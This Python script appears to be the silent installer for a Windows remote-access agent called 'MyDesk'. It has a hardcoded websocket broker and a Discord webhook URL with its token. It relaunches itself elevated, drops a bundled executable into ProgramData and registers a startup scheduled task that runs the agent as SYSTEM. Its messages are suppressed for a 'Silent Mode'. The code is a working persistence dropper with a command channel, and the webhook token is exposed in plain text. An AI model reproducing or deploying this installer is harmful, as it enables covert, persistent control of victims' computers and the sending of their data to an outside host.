import sys
import os
import ctypes
import subprocess
import shutil
import json

# ==============================================================================
#  PRE-BAKED CONFIGURATION (Edit these before compiling for "Silent Mode")
# ==============================================================================
# Set this to your Render URL (e.g. "wss://myapp.onrender.com")
HARDCODED_BROKER = "wss://render-broker.onrender.com" 

# Set this to your Webhook URL (e.g. "https://discord.com/api/webhooks/...")
HARDCODED_WEBHOOK = "https://discord.com/api/webhooks/1467411432919404558/AqzabxD0V2-fNE19e5tVhGLJOpRgk42G6kd5UjZIOfvj4dvF6uyH1Z9wU4vlpqki3TiK" 
# ==============================================================================

# Resource Helpers
def get_resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

INSTALL_DIR = r"C:\ProgramData\MyDesk"
EXE_NAME = "MyDeskAgent.exe"
CONFIG_FILE = "config.json"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except (OSError, AttributeError):
        return False

def install_exe(broker_url, webhook_url):
    print("[*] Installing Agent Service...")
    
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)
    
    dest_path = os.path.join(INSTALL_DIR, EXE_NAME)
    
    # Extract Bundled Agent
    bundled_agent = get_resource_path(EXE_NAME)
    if os.path.exists(bundled_agent):
        try:
            shutil.copy2(bundled_agent, dest_path)
            # print(f"[+] Extracted Agent to {dest_path}") # Silent
        except Exception as e:
            print(f"[-] Extraction Failed: {e}")
            return
    else:
        print(f"[-] Bundled Agent not found at '{bundled_agent}'. Ensure you compiled with --add-binary")
        return

    # Write JSON Config
    config_path = os.path.join(INSTALL_DIR, CONFIG_FILE)
    config = {
        "broker_url": broker_url,
        "webhook_url": webhook_url
    }
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)
        
    # Schedule Task
    task_name = "MyDeskService"
    
    ps_cmd = f"""
    $Action = New-ScheduledTaskAction -Execute '{dest_path}'
    $Trigger = New-ScheduledTaskTrigger -AtStartup
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
    Register-ScheduledTask -TaskName "{task_name}" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
    """
    
    subprocess.run(["powershell", "-Command", ps_cmd], check=True)
    # print(f"[+] Persistence Installed: Task '{task_name}'")
    
    # Start
    # print("[*] Starting Service...")
    subprocess.run(["schtasks", "/Run", "/TN", task_name], check=False)

def main():
    # Silent Admin Check (Relaunch if needed)
    if not is_admin():
         # Safe quoting of arguments
         params = subprocess.list2cmdline(sys.argv)
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
         return

    # Determine Config
    broker = HARDCODED_BROKER
    webhook = HARDCODED_WEBHOOK

    if not broker:
        # No config found? Default to localhost silently.
        # This prevents "stdin" crashes in background mode.
        broker = "ws://localhost:8765"
        webhook = None

    install_exe(broker, webhook)
    
    # Silent Exit (No "Press Enter")
    if not HARDCODED_BROKER:
        print("\n[+] Installed (Default Config).")

if __name__ == "__main__":
    main()
